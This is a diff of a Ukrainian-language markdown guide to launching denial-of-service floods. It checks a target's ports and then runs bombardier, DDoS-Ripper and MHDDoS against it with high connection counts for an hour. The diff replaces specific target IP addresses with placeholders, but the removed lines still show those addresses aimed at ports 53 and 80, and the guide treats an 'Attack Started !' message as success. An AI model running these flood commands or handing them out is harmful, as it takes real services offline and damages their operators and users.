@@ -40,7 +40,7 @@ Address: 81.19.72.3
 Ці сайти, це аналог звичайного ping-a тільки є дані про репліки (лоад балансінг хости)
 
 ```
-https://port.ping.pe/194.54.14.186:53
+https://port.ping.pe/IP_HOST:PORT
 ```
 *АКТУАЛЬНІ ПИТАННЯ*:
 - Префікс на сторінці пише TCP port check, але порт може бути вписани як і 80 (HTTP) так і 443 (HTTPS). Але [тут](https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers) пише, що і 22 (для `ssh`) і 53 (для DNS) є портами як TCP так і UDP. Треба тільки це підтвердити на тестах.
@@ -50,7 +50,7 @@ https://port.ping.pe/194.54.14.186:53
 А тут вписати ТІЛЬКИ ХОСТ і клікнути UDP port (або Ping для провірки)
 
 ```
-https://check-host.net/check-udp?host=194.54.14.187
+https://check-host.net/check-udp?host=IP_HOST
 ```
 
 *АКТУАЛЬНІ ПИТАННЯ*: 
@@ -67,8 +67,8 @@ https://check-host.net/check-udp?host=194.54.14.187
 - https://hub.docker.com/r/alpine/bombardier
 
 ```
-docker run -ti --rm alpine/bombardier -c 10000 -d 3600s -l 194.54.14.186:80
-docker run -ti --rm alpine/bombardier -c 10000 -d 3600s -l 194.54.14.186:53/UDP
+docker run -ti --rm alpine/bombardier -c 10000 -d 3600s -l IP_HOST:PORT
+docker run -ti --rm alpine/bombardier -c 10000 -d 3600s -l IP_HOST:PORT/UDP
 ```
 
 *АКТУАЛЬНІ ПИТАННЯ*: 
@@ -91,7 +91,7 @@ https://github.com/palahsu/DDoS-Ripper
 ```
 git clone https://github.com/palahsu/DDoS-Ripper.git
 cd DDoS-Ripper
-python3 DRipper.py -s 194.54.14.186 -p 53 -t 135 -q 10000 
+python3 DRipper.py -s IP_HOST -p PORT -t 135 -q 10000 
 ```
 
 **runner** (обгортка над DDoS Runner)
@@ -115,7 +115,7 @@ https://github.com/MHProDev/MHDDoS
 git clone https://github.com/MHProDev/MHDDoS.git
 cd MHDDoS
 pip3 install -r requirements.txt 
-python3 start.py udp 194.54.14.186:53 1000 3600
+python3 start.py udp IP_HOST:PORT 1000 3600
 ```
 
 Норм якщо ви бачите "Attack Started !"
